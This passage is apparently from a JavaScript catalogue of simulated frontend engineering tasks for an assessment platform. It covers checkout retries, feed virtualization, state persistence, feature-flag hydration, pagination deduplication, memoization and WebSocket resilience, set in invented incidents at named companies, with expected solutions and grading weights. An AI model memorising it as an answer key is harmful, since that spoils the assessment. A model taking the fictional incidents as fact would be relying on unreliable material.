        successCriteria: ['All 4 Vitest tests passing green', 'Git commit opened on branch fix/prod-4092'],
        evaluationCriteria: { codeImplementation: 50, testVerification: 50 }
      }
    ],
    decisionPoints: ['Exponential vs linear backoff retry delay', 'AbortController timeout threshold (6000ms vs 10000ms)'],
    pressureEvents: ['Staff Architect Sarah Lin sends Slack message requesting emergency hotfix before sprint cutoff'],
    expectedSolution: 'Implement while loop with attempt <= maxRetries, 6s AbortController timeout, Math.pow(2, attempt) backoff delay, and Math.round((sum + Number.EPSILON) * 100) / 100.',
    acceptableApproaches: ['While loop with setTimeout promise', 'Recursive async retry helper with status checking'],
    failureConditions: ['Retrying client 4xx errors (e.g. 400 or 401)', 'Currency rounding produces floating point precision artifact'],
    finalDeliverable: 'Patched checkoutApi.js passing all unit tests with clean git commit.',
    evaluationCriteria: { rootCauseFix: 30, financialResilience: 25, automatedTests: 25, gitHygiene: 20 },
    workplaceContext: 'P1 Production Checkout Outage Remediation',
    taskType: 'production_incident',
    missionDataTemplate: {
      missionCode: 'FE-CRIT-049',
      incidentPriority: 'P1 - High Revenue Impact',
      estimatedDurationMinutes: 25,
      scenarioBrief: 'Customers attempting checkout with slow cellular connections (3G/4G) experience infinite loading spinners or duplicate charge errors. Sentry logs indicate uncaught 504 Gateway Timeouts and unhandled Promise rejections in checkoutApi.js.',
      objectives: [
        'Review Jira ticket PROD-4092 and reproduce error in the Live Browser preview.',
        'Inspect checkoutApi.js and CheckoutButton.jsx in the Monaco Code Editor.',
        'Implement exponential backoff retry logic and safe error boundary fallbacks.',
        'Run `npm test` in the terminal to ensure automated test suites pass (100% green).',
        'Stage changes, commit via Git tool, and submit for Engineering Lead signoff.'
      ],
      initialCode: {
        'src/services/checkoutApi.js': `// CRITICAL BUG: Unhandled rejected promises on 500/504
export async function submitCheckout(payload) {
  // Missing timeout and retry logic
  const response = await fetch('/api/v2/checkout', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  // BUG: Not checking response.ok properly
  const data = await response.json();
  return data;
}

export function calculateCartTotal(items, discountCode) {
  // BUG: Floating point precision error and missing null check
  let sum = items.reduce((acc, item) => acc + (item.price * item.quantity), 0);
  if (discountCode === 'DAYONE20') {
    sum = sum * 0.8; // vulnerable to 0.79999999999
  }
  return sum;
}`,
        'src/components/CheckoutButton.jsx': `import React, { useState } from 'react';
import { submitCheckout, calculateCartTotal } from '../services/checkoutApi';

export function CheckoutButton({ cartItems, onComplete }) {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);

  const handleClick = async () => {
    setLoading(true);
    setError(null);
    try {
      const result = await submitCheckout({ items: cartItems }, 3);
      if (result && result.success) {
        onComplete(result);
      } else {
        setError(result?.message || "Checkout could not be completed.");
      }
    } catch (err) {
      console.error("[Checkout Error]", err);
      setError("Network timeout. Automatic retries exhausted.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="checkout-widget">
      <button disabled={loading} onClick={handleClick} className="pay-btn">
        {loading ? "Processing Payment..." : "Pay Now ($149.00)"}
      </button>
      {error && <p className="error-banner">{error}</p>}
    </div>
  );
}`
      },
      initialTerminalHistory: [
        'dayone-fe-sandbox:~$ node -v && npm -v',
        'v20.11.1 / 10.2.4',
        'dayone-fe-sandbox:~$ git status',
        'On branch fix/prod-4092-checkout-timeout',
        'Changes not staged for commit: modified: src/services/checkoutApi.js',
        'dayone-fe-sandbox:~$ npm test',
        'FAIL src/tests/checkoutApi.test.js',
        '  ✕ should retry 3 times on 504 Gateway Timeout (received Error 504 immediately without retry)',
        '  ✕ should return clean error state without crashing React tree',
        '  ✕ should round currency discount total to 2 decimal places (expected 119.2, received 119.20000000000002)',
        '  ✕ should abort hung connections after 6000ms threshold',
        'Tests: 3 failed, 1 passed, 4 total',
        'dayone-fe-sandbox:~$'
      ],
      initialLogs: [
        '[14:02:11] Sentry Alert: Uncaught (in promise) Error: Gateway Timeout (504) at /api/v2/checkout',
        '[14:02:15] Client Browser: TypeError: Cannot read properties of undefined (reading "transactionId")',
        '[14:03:01] Customer Support Ticket #9812: "My card was charged twice when the spinner froze!"'
      ]
    }
  },

  {
    id: 'FE-L2-003',
    title: 'Infinite Scroll Virtualization & Memory Leak',
    role: 'frontend',
    level: 2,
    difficulty: 'Intermediate',
    company: 'Twitter / Timeline Feed Engineering',
    department: 'Feed Architecture & Rendering',
    domain: 'Social Media / Infinite Feed',
    skills: ['performance_opt', 'memory_management', 'dom_virtualization', 'react_state'],
    coreCompetencies: ['memory_leak_detection', 'dom_virtualization', 'performance'],
    secondarySkills: ['intersection_observer', 'garbage_collection'],
    skillTags: ['infinite_scroll', 'virtualization', 'memory_leak', 'intersection_observer'],
    situation: 'Mobile browser tabs crash with "Out of Memory" when users scroll past 300 posts in the social feed.',
    problem: 'The feed component appends DOM nodes continuously without unmounting off-screen elements, and event listeners attached to individual post cards are never removed.',
    mission: 'Implement virtualized windowing (rendering only visible items + buffer) and clean up IntersectionObserver instances on card unmount.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', profiler: 'Chrome Heap Snapshot' }
    },
    availableEvidence: [
      'Heap snapshot: 45,000 detached DOM nodes consuming 620MB of RAM after 5 minutes of scrolling',
      'Crash telemetry: Crash rate 4.8% on low-end Android devices'
    ],
    subtasks: [
      {
        id: 'FE-L2-003-S1',
        title: 'Profile Detached DOM Nodes & Observer Accumulation',
        objective: 'Inspect FeedList.jsx and analyze memory usage under continuous scrolling.',
        instructions: 'Open browser preview, simulate fast downward scrolling, and observe DOM node counts.',
        expectedActions: ['Inspect FeedList.jsx component', 'Observe total DOM node count climbing above 5000'],
        successCriteria: ['Confirmed linear memory growth with scroll depth', 'Isolated missing observer disconnect calls'],
        evaluationCriteria: { profilingAccuracy: 50, memoryAnalysis: 50 }
      },
      {
        id: 'FE-L2-003-S2',
        title: 'Implement Virtual Windowing & Observer Cleanup',
        objective: 'Render only active window of 15 items with top/bottom padding spacers and disconnect observers.',
        instructions: 'Calculate startIndex and endIndex based on scrollTop, replace flat map with windowed slice, and run memory tests.',
        expectedActions: ['Implement windowing slice in FeedList.jsx', 'Add spacer div height offsets', 'Verify DOM node count capped at < 50 items'],
        successCriteria: ['DOM node count stays constant at ~30 nodes during infinite scroll', 'Zero detached node leaks'],
        evaluationCriteria: { virtualizationQuality: 50, memoryStability: 50 }
      }
    ],
    decisionPoints: ['Windowing buffer size (3 items vs 10 items)', 'Custom windowing logic vs tanstack-virtual integration'],
    pressureEvents: ['Android user reviews: App crashes every time I scroll past 10 minutes'],
    expectedSolution: 'Calculate visible slice using itemHeight and scrollTop, render placeholder height divs, and disconnect observers.',
    acceptableApproaches: ['Virtual list windowing pattern', 'IntersectionObserver with active item recycler'],
    failureConditions: ['Scrollbar jumps erratically during fast scroll', 'Items pop in with blank flash'],
    finalDeliverable: 'Virtualized FeedList.jsx maintaining sub-50MB memory footprint indefinitely.',
    evaluationCriteria: { memoryEfficiency: 40, scrollSmoothness: 30, testValidation: 30 },
    workplaceContext: 'High-Volume Infinite Feed Optimization',
    taskType: 'performance'
  },

  {
    id: 'FE-L2-004',
    title: 'Multi-Step Checkout State Persistence & Schema Migration',
    role: 'frontend',
    level: 2,
    difficulty: 'Intermediate',
    company: 'Target / Digital Checkout Platforms',
    department: 'Cart & Purchase Funnels',
    domain: 'Retail E-Commerce / User State',
    skills: ['react_state', 'local_storage', 'data_migration', 'error_handling'],
    coreCompetencies: ['state_persistence', 'schema_validation', 'error_recovery'],
    secondarySkills: ['json_parsing', 'versioning'],
    skillTags: ['local_storage', 'persistence', 'schema_migration', 'state', 'checkout'],
    situation: 'Users refreshing the checkout page on Step 3 lose their entered shipping details, or experience white-screen crashes if their stored state was from an older app release.',
    problem: 'State is persisted to localStorage without schema versioning. When new required fields are introduced, JSON.parse loads incompatible shapes causing undefined property access.',
    mission: 'Implement versioned state persistence with Zod/schema migration fallback and automatic hydration error recovery.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', storage: 'localStorage API' }
    },
    availableEvidence: [
      'Sentry crash: TypeError: Cannot read properties of undefined (reading "zipCode") at ShippingSummary.jsx:14',
      'Cart drop-off rate: 14% on page refresh'
    ],
    subtasks: [
      {
        id: 'FE-L2-004-S1',
        title: 'Inspect Corrupted LocalStorage & Stale Schema Crashes',
        objective: 'Inject legacy version 1 schema into browser localStorage and observe white-screen crash on reload.',
        instructions: 'Open browser preview, set legacy cart payload in localStorage, reload page, and inspect stack trace.',
        expectedActions: ['Inject v1 payload into localStorage', 'Reload page to reproduce white-screen crash'],
        successCriteria: ['Reproduced crash on stale schema read', 'Identified missing schema migration handler'],
        evaluationCriteria: { crashReproduction: 50, rootCauseExplanation: 50 }
      },
      {
        id: 'FE-L2-004-S2',
        title: 'Build Schema Versioning, Migration & Graceful Fallback',
        objective: 'Write storage wrapper with version key: 2, migration function to transform v1 -> v2, and try/catch fallback.',
        instructions: 'Create usePersistedCart hook with schema validation, default fallback on parse failure, and verify state survives reload.',
        expectedActions: ['Create usePersistedCart.js', 'Add version check and migration mapper', 'Verify smooth recovery from corrupted storage'],
        successCriteria: ['Legacy storage safely upgraded without crashing', 'User inputs persist cleanly across page reloads'],
        evaluationCriteria: { resilience: 50, cleanArchitecture: 50 }
      }
    ],
    decisionPoints: ['Silent reset to defaults vs user prompt when schema cannot be migrated', 'Encrypted storage vs plain JSON'],
    pressureEvents: ['Customer support: VIP accounts complaining cart empties on accidental mobile tab swipe'],
    expectedSolution: 'Attach schemaVersion: 2, write migrateState(savedData), wrap JSON.parse in try/catch with localStorage.removeItem fallback.',
    acceptableApproaches: ['Zod safeParse with schema defaults', 'Manual version migration switch statement'],
    failureConditions: ['Corrupted JSON permanently breaks user checkout session', 'Writing to storage in tight render loop'],
    finalDeliverable: 'usePersistedCart.js with automated schema migration and crash resilience.',
    evaluationCriteria: { persistenceSafety: 40, dataMigration: 30, testPassing: 30 },
    workplaceContext: 'E-Commerce State Resiliency',
    taskType: 'state_management'
  },

  {
    id: 'FE-L2-005',
    title: 'Feature Flag Dynamic Evaluation & Hydration Mismatch',
    role: 'frontend',
    level: 2,
    difficulty: 'Intermediate',
    company: 'Netflix / Web Client Infrastructure',
    department: 'Growth & Experimentation Engineering',
    domain: 'Entertainment / A/B Testing',
    skills: ['feature_flags', 'react_lifecycle', 'ssr_hydration', 'performance_opt'],
    coreCompetencies: ['feature_flagging', 'experimentation', 'ssr_hydration'],
    secondarySkills: ['context_api', 'flicker_prevention'],
    skillTags: ['feature_flags', 'ab_testing', 'hydration', 'react', 'experiments'],
    situation: 'During an A/B test of the new hero layout, users report a visible visual flicker (layout shifts from Variant A to Variant B after 400ms) and React hydration warnings.',
    problem: 'Feature flag evaluation happens asynchronously inside a useEffect hook on client mount instead of being synchronized with initial render, causing UI flash.',
    mission: 'Refactor feature flag provider to resolve synchronously before paint, eliminate hydration mismatch, and ensure zero Cumulative Layout Shift (CLS).',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18 / Next.js SSR' }
    },
    availableEvidence: [
      'Console warning: Warning: Text content did not match. Server: "Watch Trailer" Client: "Start Free Trial"',
      'Lighthouse CLS: 0.28 (Needs Improvement due to button repositioning)'
    ],
    subtasks: [
      {
        id: 'FE-L2-005-S1',
        title: 'Trace Client Hydration Warning & Layout Shift Flicker',
        objective: 'Observe the visual flash and identify why server HTML differs from client initial render.',
        instructions: 'Load the page in browser preview with throttled CPU and observe the button text and layout transition.',
        expectedActions: ['Observe UI flicker in preview', 'Inspect FlagContext.jsx initialization timing'],
        successCriteria: ['Identified that flag state starts as null then flips in useEffect', 'Documented hydration mismatch root cause'],
        evaluationCriteria: { diagnosis: 50, metricCorrelation: 50 }
      },
      {
        id: 'FE-L2-005-S2',
        title: 'Implement Synchronous Flag Injection & Skeleton Fallback',
        objective: 'Provide initial flag state via bootstrap payload or reserved layout placeholder to eliminate CLS.',
        instructions: 'Update FlagProvider to use pre-injected bootstrap flags and ensure server/client render identical skeleton until ready.',
        expectedActions: ['Update FlagProvider.jsx', 'Remove async setState flash', 'Verify Lighthouse CLS drops to 0.00'],
        successCriteria: ['Zero hydration mismatch warnings in console', 'Flicker completely eliminated'],
        evaluationCriteria: { implementation: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['Server-side cookie flag evaluation vs client-side bootstrap window object', 'Skeleton loader vs server-rendered default'],
    pressureEvents: ['Growth Lead: Experiment results invalidated because visual flash biased user click behavior'],
    expectedSolution: 'Initialize FlagContext with pre-computed server flags, avoid flipping state post-mount, or lock container dimensions.',
    acceptableApproaches: ['Server-side flag evaluation via cookie', 'Dimension-locked skeleton placeholder during bootstrap'],
    failureConditions: ['Layout still shifts after component mounts', 'Users stuck on perpetual loading skeleton'],
    finalDeliverable: 'Flicker-free FlagProvider.jsx with 0.00 CLS and clean hydration.',
    evaluationCriteria: { hydrationHygiene: 40, flickerPrevention: 30, testValidation: 30 },
    workplaceContext: 'A/B Testing Infrastructure & Core Web Vitals',
    taskType: 'experimentation'
  },

  {
    id: 'FE-L2-006',
    title: 'Cursor-Based API Pagination & Duplicate Records Rendering',
    role: 'frontend',
    level: 2,
    difficulty: 'Intermediate',
    company: 'Slack / Desktop Web Engineering',
    department: 'Messaging Engine & Channels',
    domain: 'Enterprise Messaging / Chat',
    skills: ['api_integration', 'react_state', 'data_structures', 'rendering_optimization'],
    coreCompetencies: ['api_pagination', 'data_deduplication', 'state_management'],
    secondarySkills: ['cursor_pagination', 'keys_in_react'],
    skillTags: ['pagination', 'cursor', 'deduplication', 'react_keys', 'chat'],
    situation: 'When users scroll up in channel message history, messages occasionally render twice, throwing React "Encountered two children with the same key" warnings.',
    problem: 'The pagination fetch appends raw API pages without de-duplicating against existing state, and concurrent scroll events trigger identical cursor requests.',
    mission: 'Implement Set/Map based deduplication on message ID, lock cursor fetches while isFetchingNextPage is true, and ensure stable React key assignment.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18' }
    },
    availableEvidence: [
      'React console warning: Encountered two children with the same key, msg-89214',
      'User bug: "Same message appears three times when I scroll backwards in channel"'
    ],
    subtasks: [
      {
        id: 'FE-L2-006-S1',
        title: 'Reproduce Key Collision & Concurrent Cursor Requests',
        objective: 'Trigger fast upward scrolling in browser preview and observe network tab cursor duplication.',
        instructions: 'Scroll rapidly in MessageStream.jsx and observe duplicate keys printed to the console log.',
        expectedActions: ['Scroll rapidly upwards in preview', 'Inspect duplicate message elements and console warnings'],
        successCriteria: ['Reproduced duplicate key warning in console', 'Isolated concurrent cursor fetch race'],
        evaluationCriteria: { reproduction: 50, logAnalysis: 50 }
      },
      {
        id: 'FE-L2-006-S2',
        title: 'Implement Map Deduplication & Fetch Lock Guard',
        objective: 'Use Map(id -> message) to guarantee unique records and guard fetch with isFetching ref lock.',
        instructions: 'Refactor message reducer to merge incoming messages into a Map by ID, and lock the scroll handler while fetching.',
        expectedActions: ['Refactor state to deduplicate via Map', 'Add fetchLockRef guard to prevent double dispatch', 'Run Vitest pagination tests'],
        successCriteria: ['Zero duplicate keys in React tree', 'All messages strictly ordered chronologically'],
        evaluationCriteria: { dataHygiene: 50, testVerification: 50 }
      }
    ],
    decisionPoints: ['In-memory Map deduplication vs array filter lookup', 'Prepend vs append scroll offset adjustment'],
    pressureEvents: ['Channel messages jumbled during executive all-hands broadcast'],
    expectedSolution: 'Merge new messages using new Map([...existing, ...incoming].map(m => [m.id, m])), guard with isLoading ref.',
    acceptableApproaches: ['Map-based ID deduplication', 'TanStack Query with getNextPageParam cursor deduplication'],
    failureConditions: ['Scroll position jumps to bottom when older messages load', 'Message ordering reversed'],
    finalDeliverable: 'MessageStream.jsx with guaranteed unique keys and smooth bidirectional pagination.',
    evaluationCriteria: { deduplicationSafety: 40, scrollErgonomics: 30, testPassing: 30 },
    workplaceContext: 'Real-Time Enterprise Chat Stream',
    taskType: 'data_pagination'
  },

  {
    id: 'FE-L2-007',
    title: 'React Render Thrashing & Component Memoization',
    role: 'frontend',
    level: 2,
    difficulty: 'Intermediate',
    company: 'Figma / Web Application Engine',
    department: 'Canvas & Layers Experience',
    domain: 'Creative Cloud / High-Frequency UI',
    skills: ['performance_opt', 'react_hooks', 'memoization', 'profiling'],
    coreCompetencies: ['rendering_optimization', 'react_memo', 'profiling'],
    secondarySkills: ['use_callback', 'referential_equality'],
    skillTags: ['performance', 'render_thrashing', 'use_callback', 'react_memo', 'profiling'],
    situation: 'In a canvas layer inspector with 500 layers, selecting a single layer causes a 350ms frame drop because all 500 layer rows re-render.',
    problem: 'LayerItem components are not memoized, and the parent passes an inline anonymous arrow function onSelect={() => handleSelect(id)}, breaking referential equality.',
    mission: 'Wrap LayerItem with React.memo, stabilize callbacks with useCallback, and optimize selector subscriptions to eliminate unnecessary re-renders.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', profiler: 'React DevTools Profiler' }
    },
    availableEvidence: [
      'React Profiler: 498 components rendered because parent component rendered (Total time: 340ms)',
      'FPS meter: Drops from 60fps to 12fps during layer selection'
    ],
    subtasks: [
      {
        id: 'FE-L2-007-S1',
        title: 'Profile Render Tree in React DevTools',
        objective: 'Record a flamegraph in the browser preview while selecting layer items.',
        instructions: 'Open the React Profiler in preview, click layer #42, and observe why every child row re-renders.',
        expectedActions: ['Record profile during layer selection', 'Identify anonymous inline callback prop breakage'],
        successCriteria: ['Pinpointed referential equality failure on onSelect prop', 'Measured 300ms+ wasted render time'],
        evaluationCriteria: { profilerAnalysis: 50, rootCauseDetail: 50 }
      },
      {
        id: 'FE-L2-007-S2',
        title: 'Apply React.memo & Stable useCallback Handlers',
        objective: 'Wrap LayerItem in React.memo with custom areEqual check and stabilize handleSelect with useCallback.',
        instructions: 'Update LayerTree.jsx and LayerItem.jsx, re-run profiler, and verify that only the clicked item re-renders.',
        expectedActions: ['Wrap LayerItem in React.memo', 'Use useCallback for selection handler', 'Verify profiler shows only 1 component rendered in 4ms'],
        successCriteria: ['Render time drops from 340ms to under 10ms', 'Maintains smooth 60fps interaction'],
        evaluationCriteria: { performanceGain: 50, codeHygiene: 50 }
      }
    ],
    decisionPoints: ['Custom comparison function vs shallow default React.memo', 'Pass ID into callback vs curry in child'],
    pressureEvents: ['Design demo to leadership in 1 hour: Canvas lag is unacceptable for launch'],
    expectedSolution: 'Wrap LayerItem in React.memo, pass id to child which calls stable onSelect(id) defined via useCallback.',
    acceptableApproaches: ['React.memo with useCallback', 'Context selector with split context'],
    failureConditions: ['Selected state does not visually update', 'Over-memoization causing stale props'],
    finalDeliverable: 'Optimized LayerTree.jsx and LayerItem.jsx running at 60fps.',
    evaluationCriteria: { frameRateImprovement: 40, codeQuality: 30, testVerification: 30 },
    workplaceContext: 'High-Frequency Canvas UI Optimization',
    taskType: 'performance'
  },

  {
    id: 'FE-L2-008',
    title: 'Multi-Step Mortgage Application Workflow Failure',
    role: 'frontend',
    level: 2,
    difficulty: 'Intermediate',
    company: 'Rocket Mortgage / Consumer Web',
    department: 'Loan Application Funnel',
    domain: 'Fintech / Complex Form Workflows',
    skills: ['form_validation', 'react_state', 'routing', 'accessibility'],
    coreCompetencies: ['form_workflows', 'state_machines', 'user_journey_testing'],
    secondarySkills: ['zod_validation', 'step_wizard'],
    skillTags: ['forms', 'wizard', 'multi_step', 'validation', 'fintech'],
    situation: 'Applicants on Step 4 (Co-borrower) who click "Back" to fix their income on Step 2 find that all subsequent step data is erased, forcing them to re-type 40 fields.',
    problem: 'The wizard component resets downstream state on backward navigation instead of preserving the master form context, and field validation triggers prematurely.',
    mission: 'Preserve unified form data across all wizard steps, enable bi-directional navigation without data loss, and validate only active step fields before allowing Next.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18' }
    },
    availableEvidence: [
      'Analytics funnel: 38% drop-off between Step 3 and Step 4',
      'User feedback: "I clicked Back to check one number and the form wiped everything!"'
    ],
    subtasks: [
      {
        id: 'FE-L2-008-S1',
        title: 'Map Form State Loss During Step Traversal',
        objective: 'Navigate through wizard in browser preview, click back, and identify where state is overwritten.',
        instructions: 'Fill out Steps 1, 2, 3, click Back to Step 2, and inspect the central application state object.',
        expectedActions: ['Fill wizard steps in preview', 'Navigate backwards and verify state wipeout in console'],
        successCriteria: ['Identified step unmount state disposal bug', 'Mapped step-level validation criteria'],
        evaluationCriteria: { testingAccuracy: 50, stateDiagnosis: 50 }
      },
      {
        id: 'FE-L2-008-S2',
        title: 'Implement Unified Form Store & Step-Scoped Validation',
        objective: 'Centralize state in ApplicationProvider, validate only current step fields on Next, and persist draft.',
        instructions: 'Refactor WizardContainer.jsx with centralized state, validate only step schema on Next click, and run form test suite.',
        expectedActions: ['Lift form state to WizardProvider', 'Implement step-specific validation gate', 'Verify data persists when navigating backward and forward'],
        successCriteria: ['Navigating back and forward preserves 100% of entered fields', 'Invalid inputs block progression with inline error'],
        evaluationCriteria: { implementation: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['Keep unmounted step components in hidden DOM vs store state in central reducer', 'Validate all fields on final submit vs step-by-step'],
    pressureEvents: ['Loan origination deadline: 500 incomplete applications pending due to form frustration'],
    expectedSolution: 'Hold master state in top-level context, validate with step-scoped schema, allow backward navigation without clearing downstream data.',
    acceptableApproaches: ['React Hook Form with FormProvider', 'Custom useReducer with persistent step slice'],
    failureConditions: ['Applicant can skip required fields on Step 2 by jumping directly to Step 4', 'Form submissions submit incomplete payloads'],
    finalDeliverable: 'Resilient WizardContainer.jsx with seamless backward/forward state persistence.',
    evaluationCriteria: { workflowReliability: 40, stateIntegrity: 30, testValidation: 30 },
    workplaceContext: 'Complex Multi-Step Enterprise Form Wizard',
    taskType: 'form_workflow'
  },

  // =============================================
  // LEVEL 3: ADVANCED (8 TASKS, 16 SUBTASKS)
  // =============================================
  {
    id: 'FE-L3-001',
    title: 'Real-Time Financial Dashboard WebSocket State Synchronization',
    role: 'frontend',
    level: 3,
    difficulty: 'Advanced',
    company: 'Coinbase / Pro Trading Desk',
    department: 'Real-Time Market Data Platforms',
    domain: 'Crypto / High-Throughput Trading',
    skills: ['websocket', 'state_management', 'concurrency', 'data_throttling'],
    coreCompetencies: ['real_time_sync', 'websocket_management', 'performance_tuning'],
    secondarySkills: ['request_animation_frame', 'buffer_queues'],
    skillTags: ['websocket', 'real_time', 'throttling', 'state_sync', 'crypto'],
    situation: 'During high volatility events (1,200 price tick events/sec), the order book freezes, the browser UI becomes unresponsive, and orders are rejected with stale price alerts.',
    problem: 'Directly calling setState on every incoming WebSocket message causes severe render thrashing (1,200 renders/sec), starving the browser main thread and blocking click events.',
    mission: 'Implement an in-memory batching buffer that flushes market data to React state at 60fps using requestAnimationFrame, maintaining sub-16ms latency without dropping ticks.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', transport: 'WebSocket WSS' }
    },
    availableEvidence: [
      'Chrome DevTools: Main thread 99% utilized by React re-renders',
      'Order execution error: Order rejected: client order price lagged ticker by 4.2 seconds'
    ],
    subtasks: [
      {
        id: 'FE-L3-001-S1',
        title: 'Profile High-Frequency WebSocket Message Ingestion',
        objective: 'Observe CPU throttling and frame drops under simulated 1,000 msg/sec WebSocket load.',
        instructions: 'Start the live ticker simulation in browser preview, open the FPS meter, and note main thread lockup.',
        expectedActions: ['Simulate high-frequency ticker stream in preview', 'Verify 100% main thread saturation and UI freeze'],
        successCriteria: ['Measured frame rate collapse below 10fps', 'Pinpointed un-throttled setState in onmessage handler'],
        evaluationCriteria: { profilingPrecision: 50, rootCauseClarity: 50 }
      },
      {
        id: 'FE-L3-001-S2',
        title: 'Architect RAF Batching Buffer & Data Stream Throttling',
        objective: 'Accumulate price ticks in an in-memory mutable ref and flush batched state via requestAnimationFrame.',
        instructions: 'Update useOrderBookSocket.js with an RAF tick buffer, merge order delta updates into a mutable Map, and flush once per frame.',
        expectedActions: ['Create mutable buffer in useRef', 'Schedule flush using requestAnimationFrame', 'Ensure clean cancelAnimationFrame on unmount'],
        successCriteria: ['UI stays responsive at steady 60fps under 2,000 msgs/sec', 'Latest market prices rendered with zero lag'],
        evaluationCriteria: { architecturalElegance: 50, performanceGain: 50 }
      }
    ],
    decisionPoints: ['requestAnimationFrame vs 50ms setInterval throttle', 'Web Worker offload vs main thread batching'],
    pressureEvents: ['Market alert: Bitcoin breaking all-time high, exchange traffic up 400%'],
    expectedSolution: 'Queue incoming delta packets in a ref, dispatch single batched state update via requestAnimationFrame, cancel on cleanup.',
    acceptableApproaches: ['RAF batching with mutable Map', 'Web Worker stream parser posting batched message'],
    failureConditions: ['Order book drops delta packets causing price mismatch', 'Memory leak if RAF continues when component unmounts'],
    finalDeliverable: 'useOrderBookSocket.js maintaining 60fps under extreme message velocity.',
    evaluationCriteria: { concurrencyHandling: 40, performance: 30, testValidation: 30 },
    workplaceContext: 'High-Frequency Real-Time Market Data',
    taskType: 'real_time_systems'
  },

  {
    id: 'FE-L3-002',
    title: 'WebSocket Reconnection Storm & Heartbeat Failure',
    role: 'frontend',
    level: 3,
    difficulty: 'Advanced',
    company: 'Discord / Voice & Chat Infrastructure',
    department: 'Gateway Client Engineering',
    domain: 'Communications / Distributed Realtime',
    skills: ['websocket', 'resilience', 'networking', 'state_machines'],
    coreCompetencies: ['network_resilience', 'distributed_systems', 'state_machines'],
    secondarySkills: ['heartbeat_ping', 'backoff_jitter'],
    skillTags: ['websocket', 'reconnection', 'jitter', 'heartbeat', 'gateway'],
    situation: 'When a regional network blip drops 50,000 client connections, all clients immediately reconnect simultaneously at 0ms delay, crashing the gateway server in a thundering herd.',
    problem: 'Client socket reconnection lacks exponential backoff and randomized jitter, and missing ping/pong heartbeat detection leaves zombie sockets open indefinitely.',
    mission: 'Implement a resilient WebSocket state machine with exponential backoff + full jitter (Decorrelated Jitter), heartbeat watchdog timer, and offline message queue.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18 / TypeScript' }
    },
    availableEvidence: [
      'Gateway server logs: HTTP 503 Connection Flood: 48,000 SYN packets in 200ms',
      'Client state: Status stuck on "Connecting..." while physical wifi is disconnected'
    ],
    subtasks: [
      {
        id: 'FE-L3-002-S1',
        title: 'Diagnose Zombie Sockets & Reconnection Flood',
        objective: 'Simulate network cut in browser preview and observe immediate tight reconnect loop.',
        instructions: 'Toggle offline mode in preview and inspect terminal connection attempt logs.',
        expectedActions: ['Simulate network disconnect in preview', 'Observe rapid reconnect spam with 0ms delay'],
        successCriteria: ['Reproduced tight reconnect loop without backoff', 'Identified absent ping/pong watchdog'],
        evaluationCriteria: { networkAnalysis: 50, rootCauseDetail: 50 }
      },
      {
        id: 'FE-L3-002-S2',
        title: 'Build Jittered Exponential Backoff & Heartbeat Watchdog',
        objective: 'Implement randomized jitter backoff (min: 500ms, max: 30s) and send ping every 15s with 5s timeout.',
        instructions: 'Rewrite GatewayClient.ts with full jitter formula, heartbeat watchdog, and buffered offline message queue.',
        expectedActions: ['Implement full jitter formula: min(maxDelay, base * 2^attempt + random)', 'Implement ping/pong timeout disconnect', 'Run reconnection test suite'],
        successCriteria: ['Reconnection attempts distribute evenly across time', 'Zombie connection terminated after 5s missed ping'],
        evaluationCriteria: { protocolResilience: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['Full jitter vs equal jitter backoff algorithm', 'Queue offline messages vs drop non-essential events'],
    pressureEvents: ['Infrastructure Incident Commander: Server CPU at 100%, clients must back off immediately'],
    expectedSolution: 'Calculate delay = Math.random() * Math.min(maxDelay, baseDelay * 2 ** attempt); close socket if ping receives no pong in 5s.',
    acceptableApproaches: ['State machine with XState or custom reducer', 'Object-oriented WebSocket manager with event emitter'],
    failureConditions: ['Reconnection delay grows beyond 60 seconds locking out user', 'Multiple duplicate sockets created on rapid network toggle'],
    finalDeliverable: 'GatewayClient.ts with full jitter reconnection, heartbeat watchdog, and offline queue.',
    evaluationCriteria: { networkResilience: 40, architecturalRobustness: 30, testValidation: 30 },
    workplaceContext: 'Distributed Real-Time Gateway Client',
    taskType: 'networking'
  },

  {
    id: 'FE-L3-003',
    title: 'Enterprise DataGrid 100,000 Row Virtual Rendering Regression',
    role: 'frontend',
    level: 3,
    difficulty: 'Advanced',
    company: 'Bloomberg / Enterprise Terminal Web',
    department: 'Financial Grid & Analytics Engineering',
    domain: 'Fintech / Enterprise Analytics',
    skills: ['dom_virtualization', 'performance_opt', 'canvas_rendering', 'algorithms'],
    coreCompetencies: ['rendering_performance', 'data_structures', 'virtual_scrolling'],
    secondarySkills: ['binary_search', 'layout_computations'],
    skillTags: ['datagrid', 'virtualization', 'large_datasets', 'performance', 'dom'],
    situation: 'Financial analysts attempting to load a 100,000-row securities ledger experience a 12-second tab freeze and memory crash when sorting by market cap.',
    problem: 'Row height calculation runs in O(N) on every scroll tick, and cell value formatting instantiates new Intl.NumberFormat objects per cell per frame.',
    mission: 'Refactor DataGrid to use O(log N) binary search for visible row index calculation, cache formatter instances, and reuse DOM elements with a recycling pool.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18 / TypeScript' }
    },
    availableEvidence: [
      'Chrome profiler: 9.4 seconds spent in recalculateRowOffsets (O(N) iteration over 100k items)',
      'GC pause: 450ms garbage collection freeze every 2 seconds during scroll'
    ],
    subtasks: [
      {
        id: 'FE-L3-003-S1',
        title: 'Benchmark 100k Row Scroll Latency & Allocations',
        objective: 'Run performance benchmark script on DataGrid.tsx and analyze flamechart bottlenecks.',
        instructions: 'Execute `npm run bench:grid` in terminal and inspect CPU time spent in row offset calculations.',
